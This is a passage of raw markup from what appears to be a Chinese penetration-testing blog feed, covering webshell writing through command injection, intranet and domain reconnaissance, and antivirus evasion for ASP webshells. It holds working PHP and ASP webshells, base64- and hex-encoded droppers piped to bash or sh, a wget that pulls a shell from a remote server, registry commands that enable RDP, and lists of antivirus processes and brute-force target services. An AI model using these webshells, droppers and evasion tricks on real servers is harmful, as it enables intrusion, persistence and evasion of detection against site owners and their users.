class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> nginx<br><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> tomcat<br><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> http<br></code></pre></td></tr></table></figure><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p>确认寻找到的路径有写入权限之后，就可以开始写webshell了</p><h3 id="1-echo直接写入"><a href="#1-echo直接写入" class="headerlink" title="1.echo直接写入"></a>1.echo直接写入</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; &gt; 1.php</span><br></code></pre></td></tr></table></figure><p>直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽</p><h3 id="2-base64写入"><a href="#2-base64写入" class="headerlink" title="2.base64写入"></a>2.base64写入</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | base<span class="hljs-number">64</span> -d &gt;<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure><p>使用base64是比较通用的方法，完美去除了webshell本身的特殊字符</p><h3 id="3-绕过重定向符"><a href="#3-绕过重定向符" class="headerlink" title="3.绕过重定向符"></a>3.绕过重定向符</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">echo <span class="hljs-string">&quot;ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=&quot;</span> | <span class="hljs-type">base64</span> -d | <span class="hljs-type">bash</span><br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">echo <span class="hljs-string">&quot;ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=&quot;</span> | <span class="hljs-type">base64</span> -d | <span class="hljs-type">sh</span><br></code></pre></td></tr></table></figure><p>重定向符&gt;不可用时，我们可以将1或2中的整体命令base64编码，然后解码后通过bash或sh执行</p><p>其他字符绕过方式，如空格对应${IFS}等，可参考命令注入的绕过方式 <a href="http://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a></p><h3 id="4-远端下载webshell"><a href="#4-远端下载webshell" class="headerlink" title="4.远端下载webshell"></a>4.远端下载webshell</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">远端服务器放置webshell,开启<span class="hljs-keyword">http</span><br>python -m <span class="hljs-keyword">http</span>.server<br><br>目标机器执行<br>wget <span class="hljs-keyword">http</span>://xx.xx.xxx.xx:<span class="hljs-number">8000</span>/xxx.php<br></code></pre></td></tr></table></figure><p>可出网且有wget的情况下可采用此方式</p><h3 id="5-hex写入"><a href="#5-hex写入" class="headerlink" title="5.hex写入"></a>5.hex写入</h3><p>hex写入与base64写入相似，在 <a href="https://www.107000.com/T-Hex/">https://www.107000.com/T-Hex/</a><br>将webshell编码成hex，使用xxd命令还原</p><p>或在使用前将webshell使用xxd生成hex数据</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; |xxd -ps</span><br></code></pre></td></tr></table></figure><p>然后命令注入执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-number">3</span>C<span class="hljs-number">3</span>F<span class="hljs-number">706870206576616</span>C<span class="hljs-number">28245</span>F<span class="hljs-number">504</span>F<span class="hljs-number">53545</span>B<span class="hljs-number">315</span>D<span class="hljs-number">293</span>B<span class="hljs-number">203</span>F<span class="hljs-number">3</span>E|xxd -r -ps &gt; <span class="hljs-number">5</span>.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集总结</title>
    <link href="/2021/05/19/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/"/>
    <url>/2021/05/19/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录一些内网渗透的注意点，信息比较散乱，后续更新完善</p><h2 id="本机信息查询"><a href="#本机信息查询" class="headerlink" title="本机信息查询"></a>本机信息查询</h2><h3 id="常用信息"><a href="#常用信息" class="headerlink" title="常用信息"></a>常用信息</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">本机服务列表<br>wmic service list brief<br>本机进程列表<br>Tasklist /v<br>浏览器代理信息<br>reg query &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings&quot;<br>RDP端口号（16进制）<br>reg query &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\T</span>erminal Server<span class="hljs-symbol">\W</span>inStations<span class="hljs-symbol">\R</span>DP-TCP&quot; /V portNumber<br>用户列表<br>net user<br>本地管理员<br>net localgroup administrators<br>在线用户<br>query user || qwinsta<br></code></pre></td></tr></table></figure><h3 id="提权相关补丁信息查询和流程"><a href="#提权相关补丁信息查询和流程" class="headerlink" title="提权相关补丁信息查询和流程"></a>提权相关补丁信息查询和流程</h3><p><a href="http://uuzdaisuki.com/2021/04/12/windows%E6%8F%90%E6%9D%83%E9%80%9F%E6%9F%A5%E6%B5%81%E7%A8%8B/">http://uuzdaisuki.com/2021/04/12/windows%E6%8F%90%E6%9D%83%E9%80%9F%E6%9F%A5%E6%B5%81%E7%A8%8B/</a></p><h3 id="本机3389开启"><a href="#本机3389开启" class="headerlink" title="本机3389开启"></a>本机3389开启</h3><p>1.通用开3389：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>2.Win2003:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><p>3.Win2008:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><p>4.win08 win2003 win7 win2012 winxp</p><p>win08，win2012三条命令皆可，win7前两条:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /namespace:\root\cimv2 erminalservices <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS != &quot;&quot;) <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span><br><br>wmic /namespace:\root\cimv2 erminalservices <span class="hljs-type">path</span> win32_tsgeneralsetting <span class="hljs-keyword">where</span> (TerminalName =<span class="hljs-string">&#x27;RDP-Tcp&#x27;</span>) <span class="hljs-keyword">call</span> setuserauthenticationrequired <span class="hljs-number">1</span><br><br>reg <span class="hljs-keyword">add</span> &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d <span class="hljs-number">0</span> /f<br></code></pre></td></tr></table></figure><h3 id="杀毒软件进程名"><a href="#杀毒软件进程名" class="headerlink" title="杀毒软件进程名"></a>杀毒软件进程名</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">360s</span>d<span class="hljs-selector-class">.exe</span> <span class="hljs-number">360</span>杀毒<br><span class="hljs-number">360</span>tray<span class="hljs-selector-class">.exe</span> <span class="hljs-number">360</span>实时保护<br>ZhuDongFangYu<span class="hljs-selector-class">.exe</span> <span class="hljs-number">360</span>主动防御<br>KSafeTray<span class="hljs-selector-class">.exe</span> 金山卫士<br>SafeDogUpdateCenter<span class="hljs-selector-class">.exe</span> 服务器安全狗<br>McAfee McShield<span class="hljs-selector-class">.exe</span> McAfee<br>egui<span class="hljs-selector-class">.exe</span> NOD32<br>AVP<span class="hljs-selector-class">.EXE</span> 卡巴斯基<br>avguard<span class="hljs-selector-class">.exe</span> 小红伞<br>bdagent<span class="hljs-selector-class">.exe</span> BitDefender<br></code></pre></td></tr></table></figure><h3 id="敏感信息获取"><a href="#敏感信息获取" class="headerlink" title="敏感信息获取"></a>敏感信息获取</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">源码<br>数据库备份文件<br>浏览器密码、cookie<br><span class="hljs-number">3389</span>、ipc连接记录<br>vpn<br>哈希提取<br><span class="hljs-symbol">http:</span>//uuzdaisuki.com/<span class="hljs-number">2021</span>/<span class="hljs-number">04</span>/<span class="hljs-number">22</span>/windows<span class="hljs-variable">%E5</span><span class="hljs-variable">%93</span><span class="hljs-variable">%88</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%E6</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%90</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%96</span><span class="hljs-variable">%B9</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%80</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%93</span>/<br></code></pre></td></tr></table></figure><h2 id="域信息或内网信息收集"><a href="#域信息或内网信息收集" class="headerlink" title="域信息或内网信息收集"></a>域信息或内网信息收集</h2><p>在拿到一个shell之后，需要先判断此机器有无域环境、是否出网、是否多网卡、内网网段分别是哪些。</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dos">查看网络配置信息<br><span class="hljs-built_in">ipconfig</span> /all<br>ifconfig<br>判断主域<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure><p>根据是否出网选择不同的代理方式，如目标出网，可采用frp等方式搭建代理，不出网有webshell等情况，可采用reGeorg等方式搭建代理。</p><p>查看当前机器的网络配置信息，根据ip地址和子网掩码推测其可能存在的内网网段。以此来确认我们有没有搭建代理的必要。</p><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">view</span> 查看域内机器列表<br>net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>: ZZZ 查看ZZZ域中所有的机器列表。<br>net <span class="hljs-keyword">group</span> /<span class="hljs-keyword">domain</span> 查询域里面所有的用户组列表<br>net <span class="hljs-keyword">group</span> &quot;domain computers&quot; /<span class="hljs-keyword">domain</span> 查看所有域成员计算机列表<br>net accounts /<span class="hljs-keyword">domain</span> 查询域用户密码过期等信息<br>net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span> 获取域用户列表<br>net <span class="hljs-keyword">group</span> &quot;domain admins&quot; /<span class="hljs-keyword">domain</span> 获取域管理员列表<br>net <span class="hljs-keyword">group</span> &quot;domain controllers&quot; /<span class="hljs-keyword">domain</span> 查看域控制器<br>net <span class="hljs-keyword">local</span> <span class="hljs-keyword">group</span> administrators 查看本地管理员组用户[通常含有域用户]<br>net localgroup administrators /<span class="hljs-keyword">domain</span> 登录域管理员用户<br>net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span> 查看内网存在多少个域<br></code></pre></td></tr></table></figure><h3 id="域内命令执行"><a href="#域内命令执行" class="headerlink" title="域内命令执行"></a>域内命令执行</h3><p><a href="http://uuzdaisuki.com/2021/04/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8ipc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/04/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8ipc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</a></p><p>票据传递</p><p><a href="http://uuzdaisuki.com/2021/04/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">http://uuzdaisuki.com/2021/04/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</a></p><h3 id="敏感系统收集"><a href="#敏感系统收集" class="headerlink" title="敏感系统收集"></a>敏感系统收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">域控<br>OA系统<br>财务系统<br>数据库系统<br>邮件服务器<br>文件服务器<br>官网服务器<br>人事系统<br></code></pre></td></tr></table></figure><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>对目标内网进行扫描有两种方式，一种是通过代理进行扫描，一种是在shell中上传安装扫描工具。</p><p>上传扫描工具要考虑对方的系统、环境等情况</p><h4 id="ping探测存活"><a href="#ping探测存活" class="headerlink" title="ping探测存活"></a>ping探测存活</h4><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">1</span>、如果IP连续，例如（<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>-<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">10</span>）：<br>@<span class="hljs-built_in">echo</span> off&amp;<span class="hljs-built_in">setlocal</span> ENABLEDELAYEDEXPANSION<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">exist</span> onlist.txt<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">exist</span> offlist.txt <br><span class="hljs-keyword">for</span> /l <span class="hljs-variable">%%i</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>) <span class="hljs-keyword">do</span> (<br><span class="hljs-built_in">ping</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-variable">%%i</span>&gt;<span class="hljs-built_in">nul</span> <span class="hljs-number">2</span>&gt;<span class="hljs-built_in">nul</span><br><span class="hljs-keyword">if</span> <span class="hljs-variable">!errorlevel!</span>==<span class="hljs-number">0</span> (<span class="hljs-built_in">echo</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-variable">%%i</span> &gt;&gt;c:\bat\onlist.txt) <span class="hljs-keyword">else</span> (<span class="hljs-built_in">echo</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-variable">%%i</span> &gt;&gt;c:\bat\offlist.txt)<br>)<br> <br><span class="hljs-number">2</span>、如果IP不连续，那使用一个文件plist写入要测试的地址列表，然后批处理：<br>@<span class="hljs-built_in">echo</span> off&amp;<span class="hljs-built_in">setlocal</span> ENABLEDELAYEDEXPANSION<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">exist</span> c:\bat\onlist.txt <span class="hljs-built_in">del</span> c:\bat\onlist.txt<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">exist</span> c:\bat\offlist.txt <span class="hljs-built_in">del</span> c:\bat\offlist.txt <br><span class="hljs-keyword">for</span> /f <span class="hljs-variable">%%i</span> <span class="hljs-keyword">in</span> (c:\bat\pclist.txt) <span class="hljs-keyword">do</span> (<br><span class="hljs-built_in">ping</span> -n <span class="hljs-number">1</span> <span class="hljs-variable">%%i</span>&gt;<span class="hljs-built_in">nul</span> <span class="hljs-number">2</span>&gt;<span class="hljs-built_in">nul</span><br><span class="hljs-keyword">if</span> <span class="hljs-variable">!errorlevel!</span>==<span class="hljs-number">0</span> (<span class="hljs-built_in">echo</span> <span class="hljs-variable">%%i</span> &gt;&gt;c:\bat\onlist.txt) <span class="hljs-keyword">else</span> (<span class="hljs-built_in">echo</span> <span class="hljs-variable">%%i</span> &gt;&gt;c:\bat\offlist.txt)<br>)<br></code></pre></td></tr></table></figure><h4 id="自写python脚本探测端口"><a href="#自写python脚本探测端口" class="headerlink" title="自写python脚本探测端口"></a>自写python脚本探测端口</h4><p>由于linux系统和程序员使用的windows环境一般都存在python环境，使用自写python脚本portscan扫描内网端口也很方便</p><p>常用的扫描端口列表<br>21,22,80,443,445,1433,1521,3306,3389,5900,6379,7001,8000,8080,8443</p><h3 id="内网常见端口对应服务攻击"><a href="#内网常见端口对应服务攻击" class="headerlink" title="内网常见端口对应服务攻击"></a>内网常见端口对应服务攻击</h3><h4 id="针对各类服务爆破"><a href="#针对各类服务爆破" class="headerlink" title="针对各类服务爆破"></a>针对各类服务爆破</h4><p>使用爆破工具获得口令,重点攻击：</p><ul><li>FTP（ 21 / TCP）</li><li>SSH（ 22 / TCP）</li><li>Telnet（ 23 / TCP）</li><li>NetBIOS / SMB / Samba（ 139 / TCP 和 445 / TCP）</li><li>LDAP（ 389 / TCP）</li><li>Kerberos（ 88 / TCP）</li><li>RDP /终端服务（ 3389 / TCP）</li><li>HTTP(S) / HTTP 管理服务（ 80 / TCP 和 443 / TCP）</li><li>MSSQL（ 1433 / TCP）</li><li>Oracle（ 1521 / TCP）</li><li>MySQL（ 3306 / TCP）</li><li>VNC（ 5900 / TCP）</li></ul><h4 id="其他未授权访问端口"><a href="#其他未授权访问端口" class="headerlink" title="其他未授权访问端口"></a>其他未授权访问端口</h4><ul><li>Redis（6379）</li><li>MongoDB（27017）</li><li>Elasticsearch（9200）</li><li>ZooKeeper（2181，2182）</li><li>docker（2375）</li><li>Memcached（11211）</li><li>nfs（2049）</li><li>CouchDB（5984）</li><li>hadoop（50070）</li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>Weblogic（7001/weblogic反序列化）</li><li>Zabbix （8069/命令执行）</li><li>Jenkins(8080-8089/控制台命令执行)</li><li>JBoss(8080-8089/反序列化)</li></ul>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webshell免杀研究asp篇</title>
    <link href="/2021/05/15/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6asp%E7%AF%87/"/>
    <url>/2021/05/15/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6asp%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>向服务器端发送恶意代码写成的文件(即：shell)，客户端通过远程连接，利用shell连接到服务器，并可对服务器进行操作。</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>实现两步</p><ol><li>数据的传递</li><li>执行所传递的数据</li></ol><h3 id="数据的传递"><a href="#数据的传递" class="headerlink" title="数据的传递"></a>数据的传递</h3><p>request</p><h3 id="执行所传递的数据"><a href="#执行所传递的数据" class="headerlink" title="执行所传递的数据"></a>执行所传递的数据</h3><p>Eval</p><p>Execute</p><p>ExecuteGlobal</p><h2 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h2><p>相比于php和jsp，由于asp语法结构较简单，很难在代码中完全不出现eval、execute等关键字，而request本身不被查杀，所以要对request的变量传递到execute等变量的过程做一定处理，使杀毒软件无法直接检测到两者的关系。</p><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>使用数组中的变量接收传入参数，规避查杀</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&lt;<span class="hljs-meta">%</span><br>dim a<span class="hljs-comment">(5)</span><br>a<span class="hljs-comment">(0)</span>=request<span class="hljs-comment">(&quot;99999&quot;)</span><br>eXecUTe<span class="hljs-comment">(a(0)</span>)<br><span class="hljs-meta">%</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>使用函数将数据传递与执行分开，规避查杀</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">&lt;%<br><span class="hljs-keyword">Function</span> a():<br>    a = <span class="hljs-built_in">request</span>(<span class="hljs-string">&quot;99999&quot;</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><span class="hljs-keyword">Function</span> b():<br>    <span class="hljs-keyword">eXecUTe</span>(a())<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br>b()<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="使用字符串处理函数"><a href="#使用字符串处理函数" class="headerlink" title="使用字符串处理函数"></a>使用字符串处理函数</h3><p>使用asp的一些默认字符串处理函数做处理，再配合数组或函数等，将数据传递与执行分开，规避查杀</p><p>字符串处理函数</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs excel">函数描述<br>InStr返回字符串在另一字符串中首次出现的位置。检索从字符串的第一个字符开始。<br>InStrRev返回字符串在另一字符串中首次出现的位置。检索从字符串的最末字符开始。<br>LCase把指定字符串转换为小写。<br><span class="hljs-built_in">Left</span>从字符串的左侧返回指定数目的字符。<br><span class="hljs-built_in">Len</span>返回字符串中的字符数目。<br>LTrim删除字符串左侧的空格。<br>RTrim删除字符串右侧的空格。<br><span class="hljs-built_in">Trim</span>删除字符串左侧和右侧的空格。<br><span class="hljs-built_in">Mid</span>从字符串返回指定数目的字符。<br><span class="hljs-built_in">Replace</span>使用另外一个字符串替换字符串的指定部分指定的次数。<br><span class="hljs-built_in">Right</span>返回从字符串右侧开始指定数目的字符。<br>Space返回由指定数目的空格组成的字符串。<br>StrComp比较两个字符串，返回代表比较结果的一个值。<br>String返回包含指定长度的重复字符的字符串。<br>StrReverse反转字符串。<br>UCase把指定的字符串转换为大写。<br></code></pre></td></tr></table></figure><p>用法示例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Mid</span><span class="hljs-params">(str, <span class="hljs-number">3</span>)</span></span> 从str的第<span class="hljs-number">3</span>个字符开始截取到最后<br><span class="hljs-function"><span class="hljs-title">Mid</span><span class="hljs-params">(str, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)</span></span> 从str的第<span class="hljs-number">3</span>个字符开始截取之后的<span class="hljs-number">2</span>个字符<br><span class="hljs-function"><span class="hljs-title">Left</span><span class="hljs-params">(str, <span class="hljs-number">3</span>)</span></span> 截取str的前三个字符<br><span class="hljs-function"><span class="hljs-title">Right</span><span class="hljs-params">(str, <span class="hljs-number">3</span>)</span></span> 截取str的后三个字符<br><span class="hljs-function"><span class="hljs-title">StrReverse</span><span class="hljs-params">(str)</span></span> 反转字符串<br></code></pre></td></tr></table></figure><p>免杀木马示例：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">&lt;%<br><span class="hljs-keyword">Function</span> x():<br>    x = <span class="hljs-built_in">request</span>(<span class="hljs-string">&quot;99999&quot;</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br>y = <span class="hljs-built_in">Mid</span>(x(),<span class="hljs-number">1</span>)<br>z = y&amp;<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">eXecUTe</span>(z)<br>%&gt;<br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sas">&lt;%<br>Function <span class="hljs-meta">x</span>():<br>    <span class="hljs-meta">x</span> = request(<span class="hljs-string">&quot;99999&quot;</span>)<br><span class="hljs-meta">End</span> Function<br>y = St<span class="hljs-meta">rReverse(</span><span 